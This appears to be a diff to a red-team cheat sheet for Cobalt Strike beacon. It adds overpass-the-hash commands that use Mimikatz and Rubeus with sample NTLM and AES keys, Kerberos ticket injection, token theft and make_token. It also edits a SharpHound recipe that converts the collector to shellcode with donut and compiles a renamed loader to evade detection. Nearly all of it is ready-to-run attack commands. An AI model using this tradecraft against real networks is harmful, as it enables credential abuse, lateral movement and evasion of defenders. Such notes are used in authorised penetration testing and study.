@@ -27,6 +27,42 @@ beacon> link <IP>
 
 
 
+## Overpass-the-Hash
+
+More opsec PtH than builtin `pth` command:
+
+```
+beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
+beacon> steal_token 1337
+```
+
+Same with Rubeus (must be in elevated context):
+
+```
+beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+beacon> steal_token 1337
+```
+
+Use Rubeus with lower privileges:
+
+```
+beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec
+
+PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("[...TICKET...]"))
+Or
+$ echo -en "[...TICKET...]" | base64 -d > tgt.kirbi
+
+beacon> run klist
+Or
+beacon> execute-assembly Rubeus.exe klist
+
+beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
+beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
+```
+
+
+
+
 ## BloodHound
 
 * [https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146)
@@ -39,7 +75,7 @@ RNDNAME=`curl -sL https://github.com/penetrarnya-tm/WeaponizeKali.sh/raw/main/mi
 wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe
 
 # --ldapusername snovvcrash --ldappassword Passw0rd!
-~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\ProgramData --ZipFilename sweetbl.zip' -o /tmp/SharpHound.bin
+~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\Windows\Tasks --ZipFilename sweetbl.zip' -o /tmp/SharpHound.bin
 
 BUF=`xxd -i /tmp/SharpHound.bin | head -n-2 | tail -n+2 | tr -d ' ' | tr -d '\n'`
 BUFSIZE=`xxd -i /tmp/SharpHound.bin | tail -n1 | awk '{print $5}' | tr -d ';\n'`
@@ -73,8 +109,8 @@ namespace Sh4rpH0und
 }
 EOF
 
-mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"/tmp/$RNDNAME.exe"
-file "/tmp/$RNDNAME.exe"
-cp "/tmp/$RNDNAME.exe" .
+mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"$RNDNAME.exe"
+file "$RNDNAME.exe"
+rm "/tmp/SharpHound.exe" "/tmp/SharpHound.bin" "/tmp/$RNDNAME.cs"
 ```
 {% endcode %}
